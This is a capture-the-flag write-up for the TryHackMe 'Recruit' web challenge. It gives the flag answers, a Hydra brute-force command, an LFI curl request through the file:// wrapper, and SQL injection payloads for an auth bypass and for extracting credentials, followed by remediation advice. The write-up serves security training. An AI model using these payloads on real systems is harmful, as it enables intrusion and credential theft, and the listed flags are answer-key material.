# TryHackMe — Recruit

| | |
|---|---|
| **URL** | https://tryhackme.com/room/recruitwebchallenge |
| **Category** | Red Team / Web Exploitation |
| **Difficulty** | Medium |
| **Estimated Time** | 60 minutes |
| **Completions** | 7,838 |
| **Date Completed** | 2026-10-05 |

## Overview
Infiltrate Recruit's new portal. Map the site, hunt for flaws, and gain unauthorised access.

---

| # | Question | Answer |
|---|----------|--------|
| 1 | What is the flag value after logging in as a normal user? | THM{LOGGED_IN_USER} |
| 2 | What is the flag value after logging in as admin? | THM{LOGGED_IN_ADM1N1} |

---

## Attack Chain

| Step | Tactic | Technique | Tool / Method |
|------|--------|-----------|---------------|
| 1 | Recon | Port scanning | nmap |
| 2 | Recon | DNS fingerprinting (CHAOS query) | dig |
| 3 | Initial access attempt | Credential brute force on login form | Hydra (http-post-form) |
| 4 | Exploitation | Local File Inclusion via `file://` wrapper | `file.php?cv=file://config.php` |
| 5 | Exploitation | SQL Injection — auth bypass | `' OR '1'='1` |
| 6 | Exploitation | SQL Injection — UNION-based data extraction | Candidate search field |
| 7 | Post-exploitation | Admin credential extraction | `UNION SELECT` from `users` table |

---

## Tools & Commands

```bash
# Recon — DNS fingerprinting
dig @<IP> version.bind txt chaos

# Hydra — brute force attempt against login form (never confirmed successful)
hydra -l hr -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/LOGIN_PATH:USER_FIELD=^USER^&PASS_FIELD=^PASS^:Invalid credentials" -t 4 -V

# LFI — reading local source via file:// wrapper
curl "http://<IP>/file.php?cv=file://config.php"

# SQLi — confirm injectability
'

# SQLi — authentication bypass
' OR '1'='1

# SQLi — determine column count
' ORDER BY 4-- -

# SQLi — confirm UNION structure
' UNION SELECT NULL,NULL,NULL,NULL-- -

# SQLi — enumerate tables in current database
' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -

# SQLi — enumerate columns in users table
' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' AND table_schema=database()-- -

# SQLi — extract credentials
' UNION SELECT username,password,NULL,NULL FROM users-- -
```

## Vulnerabilities Identified

| Vulnerability | Severity | Description |
|---------------|----------|-------------|
| Local File Inclusion (LFI) | High | `cv` parameter in `file.php` accepts the `file://` wrapper, allowing arbitrary local file read (e.g. `config.php`) |
| SQL Injection (error-based → UNION-based) | Critical | Candidate search field does not sanitise input — enables auth bypass and full database enumeration/extraction |
| Cleartext password storage | Medium | Admin credentials stored unhashed in the `users` table |

## Remediation & Recommendations
- Validate and whitelist the `cv` parameter; reject stream wrappers (`file://`, `http://`, `php://`, etc.)
- Use parameterised queries / prepared statements instead of string-concatenated SQL
- Hash passwords (bcrypt/argon2) instead of storing them in plaintext
